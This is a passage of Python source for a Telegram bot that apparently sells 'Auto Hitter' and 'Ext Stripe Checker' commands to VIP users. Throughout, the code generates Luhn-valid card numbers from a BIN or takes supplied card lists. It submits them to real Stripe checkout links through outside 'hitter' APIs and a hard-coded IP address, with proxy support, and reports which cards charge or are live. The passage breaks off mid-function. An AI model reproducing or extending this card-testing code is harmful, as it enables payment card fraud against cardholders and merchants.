    u = url.lower()
    if "invoice" in u:    return "invoice"
    if "billing" in u:    return "billing"
    return "checkout"

def _ah_call(checkout_url, card, uid=None, retry=1):
    """
    Hit Stripe checkout via stripe-hitter.onrender.com Checkout API.

    Endpoints:
      CC mode:  /stripe/checkout-based/url/{URL}/pay/cc/{CARD_DATA}
      BIN mode: /stripe/checkout-based/url/{URL}/pay/gen/{BIN}?retry={N}

    Returns dict with status/message/elapsed/card_info/merchant/amount.
    """
    t0 = time.time()
    try:
        # URL-encode the checkout URL for the path parameter
        encoded_url = urllib.parse.quote(checkout_url.strip(), safe='')
        card_clean  = card.strip()

        # Build the API endpoint
        api_url = (
            f"{_AH_API_BASE}/stripe/checkout-based/url/{encoded_url}"
            f"/pay/cc/{urllib.parse.quote(card_clean, safe='')}"
        )

        resp = requests.get(api_url, timeout=60)
        elapsed = time.time() - t0

        try:
            data = resp.json()
        except Exception:
            # Fallback: parse plain text response
            text = resp.text.strip()
            if resp.status_code != 200:
                return {"status": "error", "message": f"HTTP {resp.status_code}: {text[:100]}",
                        "elapsed": elapsed, "card_info": None}
            return {"status": "error", "message": text[:150],
                    "elapsed": elapsed, "card_info": None}

        # ── Normalize response to ah-compatible format ───────────────────
        raw_status  = str(data.get("status", data.get("result", ""))).lower()
        raw_message = str(data.get("message", data.get("response", data.get("msg", "Unknown"))))
        merchant    = str(data.get("merchant", data.get("merchant_name", "N/A")))
        amount      = str(data.get("amount", data.get("charge_amount", "N/A")))
        raw_msg_lc  = raw_message.lower()

        # Map to internal statuses
        if any(k in raw_status for k in ("charged", "approved", "success", "succeeded")):
            norm_st = "charged"
        elif any(k in raw_status for k in ("live", "ccn")):
            norm_st = "live"
        elif any(k in raw_msg_lc for k in ("insufficient", "funds", "balance")):
            norm_st = "live_declined"
            raw_message = raw_message or "Insufficient Funds"
        elif any(k in raw_msg_lc for k in ("otp", "3d", "authenticate", "secure", "challenge", "verify")):
            norm_st = "live_declined"
            raw_message = raw_message or "3DS/OTP Required"
        elif any(k in raw_status for k in ("3ds", "otp", "challenge")):
            norm_st = "live_declined"
            raw_message = raw_message or "3DS/OTP Required"
        elif any(k in raw_status for k in ("error", "fail", "timeout")):
            norm_st = "error"
        elif any(k in raw_status for k in ("expired", "captcha")):
            norm_st = "error"
        else:
            norm_st = "dead"

        return {
            "status":    norm_st,
            "message":   raw_message,
            "elapsed":   elapsed,
            "card_info": data.get("card_info", None),
            "merchant":  merchant,
            "amount":    amount,
        }
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "API timeout (60s)",
                "elapsed": time.time() - t0, "card_info": None}
    except requests.exceptions.ConnectionError:
        return {"status": "error", "message": "API connection failed — server may be cold-starting",
                "elapsed": time.time() - t0, "card_info": None}
    except Exception as e:
        return {"status": "error", "message": str(e)[:100],
                "elapsed": time.time() - t0, "card_info": None}


def _ah_call_bin(checkout_url, bin_num, retry=3):
    """
    BIN/Gen mode — auto-generate card from BIN and hit checkout.
    Endpoint: /stripe/checkout-based/url/{URL}/pay/gen/{BIN}?retry={N}
    """
    t0 = time.time()
    try:
        encoded_url = urllib.parse.quote(checkout_url.strip(), safe='')
        bin_clean   = bin_num.strip()[:6]

        api_url = (
            f"{_AH_API_BASE}/stripe/checkout-based/url/{encoded_url}"
            f"/pay/gen/{bin_clean}"
        )
        params = {"retry": str(retry)}

        resp = requests.get(api_url, params=params, timeout=90)
        elapsed = time.time() - t0

        try:
            data = resp.json()
        except Exception:
            text = resp.text.strip()
            return {"status": "error", "message": f"HTTP {resp.status_code}: {text[:100]}",
                    "elapsed": elapsed, "card_info": None}

        raw_status  = str(data.get("status", data.get("result", ""))).lower()
        raw_message = str(data.get("message", data.get("response", data.get("msg", "Unknown"))))
        merchant    = str(data.get("merchant", data.get("merchant_name", "N/A")))
        amount      = str(data.get("amount", data.get("charge_amount", "N/A")))
        card_used   = str(data.get("card", data.get("cc", "")))
        raw_msg_lc  = raw_message.lower()

        if any(k in raw_status for k in ("charged", "approved", "success", "succeeded")):
            norm_st = "charged"
        elif any(k in raw_status for k in ("live", "ccn")):
            norm_st = "live"
        elif any(k in raw_msg_lc for k in ("insufficient", "funds", "balance")):
            norm_st = "live_declined"
        elif any(k in raw_msg_lc for k in ("otp", "3d", "authenticate", "secure", "challenge")):
            norm_st = "live_declined"
        elif any(k in raw_status for k in ("3ds", "otp")):
            norm_st = "live_declined"
        elif any(k in raw_status for k in ("error", "fail", "timeout")):
            norm_st = "error"
        else:
            norm_st = "dead"

        return {
            "status":    norm_st,
            "message":   raw_message,
            "elapsed":   elapsed,
            "card_info": data.get("card_info", None),
            "card":      card_used,
            "merchant":  merchant,
            "amount":    amount,
        }
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "API timeout (90s)",
                "elapsed": time.time() - t0, "card_info": None}
    except requests.exceptions.ConnectionError:
        return {"status": "error", "message": "API connection failed",
                "elapsed": time.time() - t0, "card_info": None}
    except Exception as e:
        return {"status": "error", "message": str(e)[:100],
                "elapsed": time.time() - t0, "card_info": None}


def _ah_emoji(d):
    s = d.get("status", "").lower()
    m = d.get("message", "").lower()
    if s in ("charged", "approved"):          return "✅"
    if s == "live":                            return "⚡"
    if s in ("live_declined",):
        if any(x in m for x in ("insufficient", "funds", "balance")): return "💳"
        if any(x in m for x in ("otp", "3d", "authenticate", "secure", "challenge", "verify")): return "🔐"
        return "⚠️"
    if s == "error":                           return "🔴"
    # dead — check message for sub-type
    if any(x in m for x in ("otp", "3d", "authenticate", "secure", "challenge", "verify")): return "🔐"
    if any(x in m for x in ("insufficient", "funds", "balance")):                           return "💳"
    return "❌"

def _ah_word(d):
    s = d.get("status", "").lower()
    m = d.get("message", "").lower()
    if s in ("charged", "approved"):          return "Charged"
    if s == "live":                            return "Live"
    if s == "live_declined":
        if any(x in m for x in ("insufficient", "funds", "balance")): return "Insufficient Funds"
        if any(x in m for x in ("otp", "3d", "authenticate", "secure", "challenge", "verify")): return "OTP"
        return "Declined"
    if s == "error":                           return "Error"
    # dead — check message for sub-type
    if any(x in m for x in ("otp", "3d", "authenticate", "secure", "challenge", "verify")): return "OTP"
    if any(x in m for x in ("insufficient", "funds", "balance")):                           return "Insufficient Funds"
    return "Dead"

@bot.message_handler(commands=["ah"])
def ah_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as f:
            json_data = json.load(f)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'

        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode='HTML')
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ Wait {wait}s before next check.</b>", parse_mode='HTML')
            return

        usage_msg = (
            "<b>🔥 <u>Auto Hitter</u> (Stripe Checkout API)\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Single / Multi Card:</b>\n"
            "<code>/ah https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>BIN Mode (auto-gen):</b>\n"
            "<code>/ah https://checkout.stripe.com/xxx\n"
            "411111</code>\n"
            "or: <code>/ah https://... 411111 30</code>\n"
            "<i>(BIN amount — default 15, max 100)</i>\n\n"
            "📌 <b>Reply to /gen message:</b>\n"
            "Reply to gen message → <code>/ah https://...</code>\n\n"
            "📌 <b>Reply to .txt file:</b>\n"
            "Reply to .txt → <code>/ah https://...</code>\n\n"
            "Gates: checkout · invoice · billing (auto-detected from URL)\n"
            "━━━━━━━━━━━━━━━━</b>"
        )

        replied = message.reply_to_message

        # ── Bulk checker helper ─────────────────────────────────────────
        def _run_ah_bulk(checkout_url, card_lines, src_label):
            gate  = _ah_gate(checkout_url)
            total = len(card_lines)
            charged = live = dead = err = otp = insuf = checked = 0
            hits = []
            results_lines = []

            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
            try:
                stopuser[f'{id}']['status'] = 'start'
            except:
                stopuser[f'{id}'] = {'status': 'start'}

            log_command(message, query_type='gateway', gateway='ah_hitter')
            msg = bot.reply_to(message,
                f"<b>🔥 Auto Hitter [{gate.upper()}] → {src_label}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 Total: {total} cards\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ Starting...</b>",
                reply_markup=stop_kb, parse_mode='HTML')

            def build_ah_msg(status_text="⏳ Checking..."):
                if "DONE" in status_text:
                    _top = "✨ ✦ ─── A H   D O N E ─── ✦ ✨"
                elif "STOP" in status_text:
                    _top = "🛑 ─── S T O P P E D ─── 🛑"
                else:
                    _top = "✨ ✦ ─── A U T O   H I T T E R ─── ✦ ✨"
                header = (
                    f"<b>{_top}\n"
                    f"╔══════════════════════════╗\n"
                    f"║  🔥  Auto Hitter [{gate.upper()[:3]}]   ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│ 📋 {src_label}\n"
                    f"│ {checked}/{total} checked   {status_text}\n"
                    f"│ ✅ {charged}  ⚡ {live}  🔐 {otp}  💳 {insuf}  ❌ {dead}  🔴 {err}\n"
                    f"└──────────────────────────\n"
                )
                body = "\n".join(results_lines[-10:])
                footer_hits = ""
                if hits:
                    hits_lines = "".join(
                        f"\n╔══ {em} HIT ({_ah_word(res)}) ══╗\n"
                        f"│ <code>{cc}</code>\n"
                        f"│ 💬 {res.get('message','N/A')[:80]}\n"
                        f"│ ⏱️ {res.get('elapsed',0):.2f}s\n"
                        f"└────────────\n"
                        for cc, res, em in hits[-8:]
                    )
                    footer_hits = f"\n🎯 <b>HITS ({len(hits)})</b>" + hits_lines
                full = header + body + footer_hits + "\n✨ ✦ ─────────────── ✦ ✨\n       ⌤ Bot by @yadistan</b>"
                if len(full) > 4000:
                    full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n       ⌤ Bot by @yadistan</b>"
                return full

            for cc in card_lines:
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_ah_msg("🛑 STOPPED"), parse_mode='HTML')
                    except: pass
                    return

                cc = cc.strip()
                result = _ah_call(checkout_url, cc, uid=id)
                checked += 1
                log_card_check(id, cc, 'ah_hitter', result.get('message', '')[:80])

                em   = _ah_emoji(result)
                s    = result.get("status", "").lower()
                word = _ah_word(result)
                if s in ("charged", "approved"):
                    charged += 1
                    hits.append((cc, result, em))
                elif s == "live":
                    live += 1
                    hits.append((cc, result, em))
                elif s == "error":
                    err += 1
                elif word == "OTP":
                    otp += 1
                elif word == "Insufficient Funds":
                    insuf += 1
                else:
                    dead += 1

                _msg = result.get("message", "")
                _msg_short = f"  ·  {_msg[:40]}" if _msg else ""
                results_lines.append(
                    f"{em} <b>{_ah_word(result)}</b>{_msg_short}\n    └ <code>{cc}</code>"
                )

                if checked % 5 == 0 or checked == total:
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_ah_msg(), parse_mode='HTML',
                                              reply_markup=stop_kb)
                        time.sleep(0.5)
                    except Exception:
                        time.sleep(1)

            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_ah_msg("✅ DONE"), parse_mode='HTML')
            except: pass

        # ── Mode 1: Reply to .txt file ───────────────────────────────────
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):
            txt_parts = message.text.split()
            if len(txt_parts) < 2:
                bot.reply_to(message,
                    "<b>❌ URL missing. Usage:\nReply to .txt → <code>/ah https://...</code></b>",
                    parse_mode='HTML')
                return
            checkout_url = txt_parts[1].strip()
            if not checkout_url.startswith('http'):
                bot.reply_to(message, "<b>❌ Invalid URL.</b>", parse_mode='HTML')
                return
            wm = bot.reply_to(message, "<b>⏳ Downloading file...</b>", parse_mode='HTML')
            try:
                fi  = bot.get_file(replied.document.file_id)
                dl  = bot.download_file(fi.file_path)
                raw = dl.decode('utf-8', errors='ignore')
            except Exception as e:
                bot.edit_message_text(f"<b>❌ Download failed: {str(e)[:80]}</b>",
                                      chat_id=message.chat.id, message_id=wm.message_id,
                                      parse_mode='HTML')
                return
            bot.delete_message(message.chat.id, wm.message_id)
            card_lines = [_extract_cc(l.strip()) for l in raw.splitlines() if _extract_cc(l.strip())]
            if not card_lines:
                bot.reply_to(message, "<b>❌ No valid CCs found in file.</b>", parse_mode='HTML')
                return
            _run_ah_bulk(checkout_url, card_lines, f"📄 {replied.document.file_name} ({len(card_lines)} cards)")
            return

        # ── Mode 2: Reply to gen/CC text message ─────────────────────────
        if replied and not (replied.document and replied.document.file_name
                            and replied.document.file_name.lower().endswith('.txt')):
            cmd_parts = message.text.split()
            if len(cmd_parts) >= 2 and cmd_parts[1].startswith('http'):
                replied_text = replied.text or replied.caption or ""
                reply_cards  = []
                seen_r       = set()
                for _rl in replied_text.splitlines():
                    _cc = _extract_cc(_rl.strip())
                    if _cc and _cc not in seen_r:
                        reply_cards.append(_cc)
                        seen_r.add(_cc)
                if reply_cards:
                    _run_ah_bulk(cmd_parts[1], reply_cards, f"📋 Message ({len(reply_cards)} cards)")
                    return

        # ── Mode 3: Inline URL + card(s) ─────────────────────────────────
        try:
            lines = message.text.split('\n')
            first_rest = lines[0].split(' ', 1)

            # Case A: /ah\nhttps://...\ncard1\ncard2
            if len(first_rest) < 2 or not first_rest[1].strip():
                # URL must be on line 2
                if len(lines) < 2 or not lines[1].strip().startswith('http'):
                    raise IndexError
                checkout_url = lines[1].strip()
                raw_lines    = [l.strip() for l in lines[2:] if l.strip()]

            # Case B: /ah https://...\ncard1\ncard2  OR  /ah https://... card
            elif len(lines) > 1:
                checkout_url = first_rest[1].strip()
                raw_lines    = [l.strip() for l in lines[1:] if l.strip()]

            # Case C: /ah https://... card  (single line)
            else:
                parts2 = first_rest[1].strip().split()
                if len(parts2) < 2:
                    raise IndexError
                checkout_url = parts2[0]
                raw_lines    = [' '.join(parts2[1:])]

            if not checkout_url.startswith('http'):
                raise ValueError
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        # ── Detect mode: Card or BIN (same logic as /co) ──────────────
        # If first token is 13+ digits or _extract_cc matches → CARD mode
        # Otherwise → BIN mode (6-12 digit number = BIN)
        first_token = raw_lines[0].split('|')[0].strip().split()[0] if raw_lines else ""
        is_card_mode = (
            (len(first_token) >= 13 and first_token.isdigit())
            or (_extract_cc(raw_lines[0]) is not None if raw_lines else False)
        )

        # ── CARD MODE ─────────────────────────────────────────────────
        if is_card_mode:
            card_lines = []
            for _rl in raw_lines:
                _cc = _extract_cc(_rl)
                if _cc:
                    card_lines.append(_cc)
            card_lines = card_lines[:10]

            if not card_lines:
                bot.reply_to(message,
                    "<b>❌ Invalid card format.</b>\n"
                    "Correct format: <code>4111111111111111|12|26|123</code>",
                    parse_mode='HTML')
                return

        # ── BIN MODE (local gen + bulk CC check via API) ─────────────
        else:
            if not raw_lines:
                bot.reply_to(message, usage_msg, parse_mode='HTML')
                return

            _bin_line  = raw_lines[0].strip()
            # Remove optional "bin" prefix
            if _bin_line.lower().startswith("bin "):
                _bin_line = _bin_line[4:].strip()

            _bin_parts = _bin_line.split()
            bin_input  = _bin_parts[0]
            # Amount = how many cards to generate (default 15, max 100)
            amount = int(_bin_parts[1]) if len(_bin_parts) >= 2 and _bin_parts[1].isdigit() else 15
            if amount < 1: amount = 1
            if amount > 100: amount = 100

            # Support pipe format: 411111|12|xx|xxx
            has_pipe = '|' in bin_input
            if has_pipe:
                _bp = bin_input.split('|')
                bin_base = _bp[0].strip()
                mm_template = _bp[1].strip() if len(_bp) > 1 else 'xx'
                yy_template = _bp[2].strip() if len(_bp) > 2 else 'xx'
                cvv_template = _bp[3].strip() if len(_bp) > 3 else 'xxx'
            else:
                bin_base = bin_input.replace('x', '').replace('X', '')
                mm_template = 'xx'
                yy_template = 'xx'
                cvv_template = 'xxx'

            if len(bin_base.replace('x', '').replace('X', '')) < 6:
                bot.reply_to(message,
                    "<b>❌ BIN must be at least 6 digits.</b>\n"
                    "Example: <code>411111</code> or <code>411111|12|26|xxx</code>",
                    parse_mode='HTML')
                return

            is_amex = bin_base[0] == '3'
            card_length = 15 if is_amex else 16
            cvv_length = 4 if is_amex else 3

            def _ah_luhn(card_number):
                digits = [int(d) for d in card_number]
                odd_digits = digits[-1::-2]
                even_digits = digits[-2::-2]
                total = sum(odd_digits)
                for d in even_digits:
                    total += sum(divmod(d * 2, 10))
                return total % 10 == 0

            def _ah_gen_card():
                cc = ''
                for ch in bin_base:
                    if ch.lower() == 'x':
                        cc += str(random.randint(0, 9))
                    else:
                        cc += ch
                while len(cc) < card_length - 1:
                    cc += str(random.randint(0, 9))
                for check_digit in range(10):
                    test = cc + str(check_digit)
                    if _ah_luhn(test):
                        cc = test
                        break
                if mm_template.lower() in ['xx', 'x', '']:
                    mm = str(random.randint(1, 12)).zfill(2)
                else:
                    mm = mm_template.zfill(2)
                from datetime import datetime as _dt_ah
                current_year = _dt_ah.now().year % 100
                if yy_template.lower() in ['xx', 'x', '']:
                    yy = str(random.randint(current_year + 1, current_year + 5)).zfill(2)
                else:
                    yy = yy_template.zfill(2)
                if cvv_template.lower() in ['xxx', 'xxxx', 'xx', 'x', '']:
                    cvv = str(random.randint(1000, 9999)) if is_amex else str(random.randint(100, 999)).zfill(3)
                else:
                    cvv = cvv_template.zfill(cvv_length)
                return f"{cc}|{mm}|{yy}|{cvv}"

            # Generate unique cards
            cards = []
            seen_cards = set()
            gen_attempts = 0
            while len(cards) < amount and gen_attempts < amount * 5:
                c = _ah_gen_card()
                if c not in seen_cards:
                    seen_cards.add(c)
                    cards.append(c)
                gen_attempts += 1

            total = len(cards)
            bin_num = bin_base[:6]
            bin_info, bank, country, country_code = get_bin_info(bin_num)

            try:
                stopuser[f'{id}']['status'] = 'start'
            except Exception:
                stopuser[f'{id}'] = {'status': 'start'}

            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))

            gate = _ah_gate(checkout_url)
            _flag_icon = _flag(country_code)
            log_command(message, query_type='gateway', gateway='ah_hitter_bin')
            msg = bot.reply_to(message,
                f"<b>🔥 AH × BIN GEN\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                f"🎯 BIN: <code>{bin_num}</code>   {bin_info}\n"
                f"🏦 {bank}\n"
                f"🌍 {_flag_icon} {country}   |   📋 {total} cards\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                f"⏳ Initializing...</b>", reply_markup=stop_kb, parse_mode='HTML')

            charged = live = dead = err = otp_cnt = insuf = checked = 0
            hits = []
            results_lines = []

            def _ah_bin_msg(status_text="⏳ Checking..."):
                pct = int(checked / total * 100) if total else 0
                bar = _prog_bar(checked, total, 12)
                header = (
                    f"<b>🔥 AH × BIN GEN  |  {status_text}\n"
                    f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                    f"🎯 BIN: <code>{bin_num}</code>   {bin_info}\n"
                    f"🏦 {bank}\n"
                    f"🌍 {_flag_icon} {country}\n"
                    f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                    f"[{bar}] {pct}%\n"
                    f"📊 <b>{checked}/{total}</b>  ┃  ✅ <b>{charged}</b>  ┃  ⚡ <b>{live}</b>  ┃  🔐 <b>{otp_cnt}</b>  ┃  💳 <b>{insuf}</b>  ┃  ❌ <b>{dead}</b>\n"
                    f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                )
                body = "\n".join(results_lines[-10:])
                footer_hits = ""
                if hits:
                    hits_lines = "".join(
                        f"\n╔══ {em} HIT ({_ah_word(res)}) ══╗\n"
                        f"│ <code>{cc}</code>\n"
                        f"│ 💬 {res.get('message','N/A')[:80]}\n"
                        f"│ ⏱️ {res.get('elapsed',0):.2f}s\n"
                        f"└────────────\n"
                        for cc, res, em in hits[-8:]
                    )
                    footer_hits = f"\n🎯 <b>HITS ({len(hits)})</b>" + hits_lines
                full = header + body + footer_hits + "\n✨ ✦ ─────────────── ✦ ✨\n       <i>⌤ Bot by @yadistan</i></b>"
                if len(full) > 4000:
                    full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n       <i>⌤ @yadistan</i></b>"
                return full

            for cc in cards:
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=_ah_bin_msg("🛑 STOPPED"), parse_mode='HTML')
                    except Exception:
                        pass
                    return

                cc = cc.strip()
                result = _ah_call(checkout_url, cc, uid=id)
                checked += 1
                log_card_check(id, cc, 'ah_hitter_bin', result.get('message', '')[:80])

                em   = _ah_emoji(result)
                word = _ah_word(result)
                s    = result.get("status", "").lower()

                if s in ("charged", "approved"):
                    charged += 1
                    hits.append((cc, result, em))
                elif s == "live":
                    live += 1
                    hits.append((cc, result, em))
                elif word == "OTP":
                    otp_cnt += 1
                    hits.append((cc, result, em))
                elif word == "Insufficient Funds":
                    insuf += 1
                    hits.append((cc, result, em))
                elif s == "error":
                    err += 1
                else:
                    dead += 1

                _msg_short = f"  ·  {result.get('message','')[:40]}" if result.get('message') else ""
                results_lines.append(
                    f"{em} <b>{word}</b>{_msg_short}\n    └ <code>{cc}</code>"
                )

                if checked % 3 == 0 or checked == total:
                    try:
                        stop_kb2 = types.InlineKeyboardMarkup()
                        stop_kb2.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=_ah_bin_msg(), parse_mode='HTML', reply_markup=stop_kb2)
                        time.sleep(0.3)
                    except Exception:
                        time.sleep(0.8)

            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=_ah_bin_msg("✅ DONE"), parse_mode='HTML')
            except Exception:
                pass
            return

        # Multi-card inline
        if len(card_lines) > 1:
            _run_ah_bulk(checkout_url, card_lines, f"Inline ({len(card_lines)} cards)")
            return

        # ── Single card ───────────────────────────────────────────────────
        card    = card_lines[0]
        gate    = _ah_gate(checkout_url)
        bin_num = card.replace('|', '')[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        log_command(message, query_type='gateway', gateway='ah_hitter')
        msg = bot.reply_to(message,
            f"<b>⏳ Checking [{gate.upper()}]...\n"
            f"🔥 Link: <code>{checkout_url[:50]}...</code>\n"
            f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')

        result  = _ah_call(checkout_url, card, uid=id)
        em      = _ah_emoji(result)
        word    = _ah_word(result)

        ci = result.get("card_info") or {}
        out = (
            f"<b>{em} {word}  ❯  <code>{card}</code>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🏦 BIN: {bin_num}  •  {bin_info}\n"
            f"🏛️ Bank: {bank}\n"
            f"🌍 Country: {country} {country_code}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🎯 Gate: {gate.capitalize()}\n"
            f"📝 Message: {result.get('message','N/A')[:150]}\n"
            f"⏱️ Time: {result.get('elapsed',0):.2f}s\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"[⌤] Bot by @yadistan</b>"
        )
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=out, parse_mode='HTML')
        except:
            bot.reply_to(message, out, parse_mode='HTML')
        log_card_check(id, card, 'ah_hitter', result.get('message','')[:80])

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== /co2 — External Stripe Checker (Link + Card/BIN) ==================
# Uses: http://178.128.110.246/stripe.php?card=CC|MM|YY|CVV
# Mirrors /co format: supports link+card, link+BIN, card-only, txt reply, msg reply
_STRIPV2_API = os.environ.get("STRIPV2_API_URL", "http://178.128.110.246/stripe.php")

def _co2_api_call(card, proxy_dict=None):
    """Call stripe.php API. Returns dict with status/message/response."""
    try:
        r = requests.get(
            _STRIPV2_API,
            params={"card": card.strip()},
            proxies=proxy_dict or {},
            timeout=30
        )
        if r.status_code == 200:
            try:
                d = r.json()
            except Exception:
                _jm = re.search(r'\{.*\}', r.text, re.DOTALL)
                d = json.loads(_jm.group()) if _jm else {}
            raw_st = (d.get("status", "") or "").upper()
            raw_resp = (d.get("response", "") or "")
            raw_msg = d.get("message", "Unknown")
            if raw_resp and raw_msg in ("Unknown", ""):
                raw_msg = raw_resp
            return {"status": raw_st.lower(), "message": raw_msg, "response": raw_resp,
                    "merchant": "Stripe PHP", "amount": "N/A", "time": "N/A", "url": ""}
        else:
            return {"status": "error", "message": f"HTTP {r.status_code}",
                    "merchant": "N/A", "amount": "N/A", "time": "N/A", "url": ""}
    except Exception as e:
        return {"status": "error", "message": str(e)[:50],
                "merchant": "N/A", "amount": "N/A", "time": "N/A", "url": ""}

@bot.message_handler(commands=["co2"])
def co2_command(message):
    """Ext Stripe checker — link+card, link+BIN, card-only, txt/msg reply."""
    def my_function():
        import html as _html
        uid = message.from_user.id
        try:
            with open("data.json", "r", encoding="utf-8") as _f:
                _jd = json.load(_f)
            BL = _jd.get(str(uid), {}).get("plan", "\U0001d5d9\U0001d5e5\U0001d5d8\U0001d5d8")
        except Exception:
            BL = "\U0001d5d9\U0001d5e5\U0001d5d8\U0001d5d8"
        if BL == "\U0001d5d9\U0001d5e5\U0001d5d8\U0001d5d8" and uid != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        allowed, wait = check_rate_limit(uid, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return

        proxy_dict_co2 = get_proxy_dict(uid)
        _uname = _html.escape(str(message.from_user.username or uid))

        usage_msg = (
            "<b>🌐 <u>𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝘃𝟮</u>\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Card Mode:</b>\n"
            "<code>/co2 4111111111111111|12|26|123</code>\n\n"
            "📌 <b>Link + Card:</b>\n"
            "<code>/co2 https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>Link + BIN (auto-gen):</b>\n"
            "<code>/co2 https://checkout.stripe.com/xxx\n"
            "411111 30</code>\n"
            "<i>(BIN amount — default 15, max 100)</i>\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Multi / Reply:</b>\n"
            "Reply to a card list or .txt file\n"
            "━━━━━━━━━━━━━━━━</b>"
        )

        def _co2_status(d):
            s = (d.get("status", "") or "").lower()
            m = (d.get("message", "") or "").lower()
            r = (d.get("response", "") or "").lower()
            _all = s + " " + m + " " + r
            if "approved" in _all or "success" in _all or "charged" in _all:
                return "✅"
            elif "insufficient" in _all:
                return "💰"
            elif any(k in _all for k in ("3d", "otp", "authenticat", "requires_action")):
                return "⚠️"
            else:
                return "❌"

        def _co2_line(d):
            s = (d.get("status", "") or "").lower()
            m = (d.get("message", "") or "").lower()
            r = (d.get("response", "") or "").lower()
            _all = s + " " + m + " " + r
            if "approved" in _all or "success" in _all:
                return "Approve"
            elif any(k in _all for k in ("3d", "otp", "authenticat")):
                return "Otp"
            elif "insufficient" in _all:
                return "Funds"
            else:
                return "Decline"

        # ── Parse input ──────────────────────────────────────────
        raw_text = message.text or ""
        lines_raw = [l.strip() for l in raw_text.split('\n') if l.strip()]
        first_tokens = lines_raw[0].split(None, 1) if lines_raw else []
        first_rest = first_tokens[1].strip() if len(first_tokens) > 1 else ''
        replied = message.reply_to_message

        checkout_url = None
        card_lines = []
        is_bin_mode = False
        bin_input = ""
        bin_amount = 15

        # ── Detect checkout URL ──────────────────────────────────
        if first_rest.startswith('http'):
            checkout_url = first_rest.split()[0]
            after_url = first_rest[len(checkout_url):].strip()
            remaining = ([after_url] if after_url else []) + lines_raw[1:]
        elif len(lines_raw) > 1 and lines_raw[1].startswith('http'):
            checkout_url = lines_raw[1].split()[0]
            remaining = lines_raw[2:]
        else:
            remaining = ([first_rest] if first_rest else []) + lines_raw[1:]

        # ── TXT FILE REPLY ───────────────────────────────────────
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):
            if not checkout_url:
                # maybe URL in command text
                if first_rest.startswith('http'):
                    checkout_url = first_rest.split()[0]
            try:
                file_info = bot.get_file(replied.document.file_id)
                downloaded = bot.download_file(file_info.file_path)
                raw_file = downloaded.decode('utf-8', errors='ignore')
            except Exception as e:
                bot.reply_to(message, f"<b>❌ File download failed: {str(e)[:80]}</b>", parse_mode='HTML')
                return
            CC_RE = re.compile(r'\d{15,19}[|: \/]\d{1,2}[|: \/]\d{2,4}[|: \/]\d{3,4}')
            card_lines = [m.group().replace(' ', '|').replace('/', '|').replace(':', '|')
                          for m in CC_RE.finditer(raw_file)]
            if not card_lines:
                bot.reply_to(message, "<b>❌ File mein koi valid CC nahi mila.</b>", parse_mode='HTML')
                return

        # ── MSG REPLY (cards from replied message) ───────────────
        elif replied and not card_lines:
            if checkout_url or first_rest.startswith('http'):
